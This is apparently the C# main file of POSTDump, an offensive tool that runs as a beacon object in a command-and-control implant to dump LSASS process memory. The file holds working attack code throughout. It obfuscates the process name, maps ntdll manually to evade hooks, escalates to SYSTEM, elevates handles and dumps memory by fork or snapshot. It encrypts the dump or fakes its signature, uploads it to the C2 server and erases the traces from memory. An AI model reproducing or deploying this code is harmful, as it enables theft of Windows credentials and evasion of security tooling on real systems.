using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using CommandLine;
using Data = DCall.Data;
using DInvoke = DCall.DynamicInvoke;
using MinidumpData = POSTMiniDump.Data;
using Minidump = POSTMiniDump.MiniDump;
using MinidumpUtils = POSTMiniDump.Utils;
using ManualMap = DCall.ManualMap;
using BOFNET;

namespace POSTDump
{
    internal class Postdump : BeaconObject
    {
        public Postdump(BeaconApi api) : base(api) { }

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        delegate Data.Native.NTSTATUS NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref ulong RegionSize, uint AllocationType, uint Protect);


        internal class Options
        {
            [Option('o', "output", Required = false, HelpText = "output filename [default: Machine_datetime.dmp]")]
            public string Output { get; set; }

            [Option('e', "encrypt", Required = false, HelpText = "Encrypt dump in-memory")]
            public bool Encrypt { get; set; }

            [Option('s', "signature", Required = false, HelpText = "Generate fake Minidump signature")]
            public bool Signature { get; set; }

            [Option("snap", Required = false, HelpText = "Use snapshot technic")]
            public bool Snapshot { get; set; }

            [Option("fork", Required = false, HelpText = "Use fork technic [default]")]
            public bool Fork { get; set; }

            [Option("elevate-handle", Required = false, HelpText = "Open a handle to LSASS with low privileges and duplicate it to gain higher privileges")]
            public bool Elevate { get; set; }
        }

        public static void Main(string[] args)
        {

            string filename = System.Environment.MachineName + "_" + DateTime.Now.ToString("ddMMyyyy_HH-mm") + ".dmp";
            bool Encrypt = false;
            bool Signature = false;
            bool Elevate = false;
            string Output = string.Empty;
            string tech = "";

            var parser = new Parser(with =>
            {
                with.CaseInsensitiveEnumValues = true;
                with.CaseSensitive = false;
                with.HelpWriter = Console.Error;

            });

            var result = Parser.Default.ParseArguments<Options>(args)
                   .WithParsed<Options>(o =>
                   {
                       if (o.Output == null)
                       {
                           Output = filename;
                       }
                       else
                       {
                           Output = o.Output;
                       }

                       if (o.Encrypt)
                       {
                           Encrypt = true;
                       }
                       if (o.Signature)
                       {
                           Signature = true;
                       }
                       if (o.Elevate)
                       {
                           Elevate = true;
                       }
                       if (o.Snapshot)
                       {
                           tech = "snapshot";
                       }
                       else
                       {
                           tech = "fork";
                       }
                   });

            if ( result.Tag == ParserResultType.NotParsed)
            {
                Environment.Exit(1);
            }

            string ProcName = "l" + "sa" + "ss";
            Process[] proc = Process.GetProcessesByName(ProcName);
            IntPtr pid = (IntPtr)(proc[0].Id);

            ulong region_size = MinidumpData.DUMP_MAX_SIZE;
            MinidumpData.dump_context dc = new MinidumpData.dump_context();
            dc.DumpMaxSize = region_size;
            dc.BaseAddress = IntPtr.Zero;
            dc.rva = 0;
            dc.Signature = MinidumpData.MINIDUMP_SIGNATURE;
            dc.Version = MinidumpData.MINIDUMP_VERSION;
            dc.ImplementationVersion = MinidumpData.MINIDUMP_IMPL_VERSION;

            //Allocate memory for dump
            Data.PE.PE_MANUAL_MAP moduleDetails = ManualMap.Map.MapModuleToMemory("C:\\Windows\\System32\\ntdll.dll");
            IntPtr stub = DInvoke.Generic.GetExportAddress(moduleDetails.ModuleBase, "NtAllocateVirtualMemory");
            NtAllocateVirtualMemory NTAVM = (NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtAllocateVirtualMemory));
            Data.Native.NTSTATUS status = NTAVM(MinidumpUtils.GetCurrentProcess(), ref dc.BaseAddress, IntPtr.Zero, ref region_size, Data.Win32.Kernel32.MEM_COMMIT, Data.Win32.WinNT.PAGE_READWRITE);
            if (status != 0)
            {
                Console.WriteLine("Could not allocate memory for the dump!");
            }

            IntPtr procHandle = IntPtr.Zero;
            IntPtr dumpHandle = IntPtr.Zero;
            uint desiredAccess = 0;
            bool successTech = false;
            bool successDump = false;

            
            
            if (Elevate)
            {
                if (!Handle.GetLsassHandle(pid, out procHandle, (uint)Data.Win32.Kernel32.ProcessAccessFlags.PROCESS_QUERY_LIMITED_INFORMATION, moduleDetails))
                {
                    Console.WriteLine("Open process failed!");
                    return;
                }

                bool system = Handle.escalate_to_system(moduleDetails);
                if (!system)
                {
                    Console.WriteLine("GetSystem failed!");
                    return;
                }

                if (tech == "snapshot")
                {
                    desiredAccess = (uint)Data.Win32.Kernel32.ProcessAccessFlags.PROCESS_QUERY_INFORMATION | (uint)Data.Win32.Kernel32.ProcessAccessFlags.PROCESS_CREATE_PROCESS;
                } 
                else if (tech == "fork")
                {
                    desiredAccess = (uint)Data.Win32.Kernel32.ProcessAccessFlags.PROCESS_CREATE_PROCESS;
                }

                if (!Handle.ElevateHandle(procHandle, desiredAccess, 0, moduleDetails, out dumpHandle))
                {
                    Console.WriteLine("Elevate handle failed.");
                    return;
                }
            }

            if (tech == "snapshot")
            {
                if (!Elevate)
                {
                    if (!Handle.GetLsassHandle(pid, out dumpHandle, (uint)Data.Win32.Kernel32.ProcessAccessFlags.PROCESS_QUERY_INFORMATION | (uint)Data.Win32.Kernel32.ProcessAccessFlags.PROCESS_CREATE_PROCESS, moduleDetails))
                    {
                        Console.WriteLine("Getting lsass handle failed!");
                        return;
                    }
                }

                successTech = Handle.Snapshot(dumpHandle, out dc.hProcess, moduleDetails);
            }

            else if (tech == "fork")
            {
                if (!Elevate){
                    if (!Handle.GetLsassHandle(pid, out dumpHandle, (uint)Data.Win32.Kernel32.ProcessAccessFlags.PROCESS_CREATE_PROCESS, moduleDetails))
                    {
                        Console.WriteLine("Getting lsass handle failed!");
                        return;
                    }
                }
                
                successTech = Handle.Fork(dumpHandle, out dc.hProcess, moduleDetails);
            }
            
            if (!successTech)
            {
                Console.WriteLine($"{tech} failed.");
                return;
            }


            successDump = Minidump.POSTDumpWriteDump(dc, Signature, Encrypt);
            if (!successDump)
            {
                Console.WriteLine("Dump failed !");
                return;
            }

            if (POSTDump.BOFNET.bofnet != null)
            {
                POSTDump.BOFNET.bofnet.UploadC2(filename, dc.BaseAddress, dc.rva, Encrypt, Signature);
            }
            else
            {
                var success = MinidumpUtils.WriteFile(Output, dc.BaseAddress, dc.rva, moduleDetails);
                if (success)
                {
                    Console.WriteLine($"Dump saved to {Output}");
                    if (Signature && Encrypt)
                    {
                        Console.WriteLine($"The dump has an invalid signature and is encrypted, to restore it run:\npython3 dump-restore.py {Output} --type both");
                    } 
                    else if (Signature)
                    {
                        Console.WriteLine($"The dump has an invalid signature, to restore it run:\npython3 dump-restore.py {Output} --type restore");
                    }
                    else if (Encrypt)
                    {
                        Console.WriteLine($"The dump is encrypted, to restore it run:\npython3 dump-restore.py {Output} --type decrypt");
                    }
                }
            }

            Handle.cleanup(dc.hProcess, tech, moduleDetails);

            if (dc.BaseAddress != IntPtr.Zero)
                MinidumpUtils.erase_dump_from_memory(dc.BaseAddress, dc.DumpMaxSize, moduleDetails);
        }        
    }
}

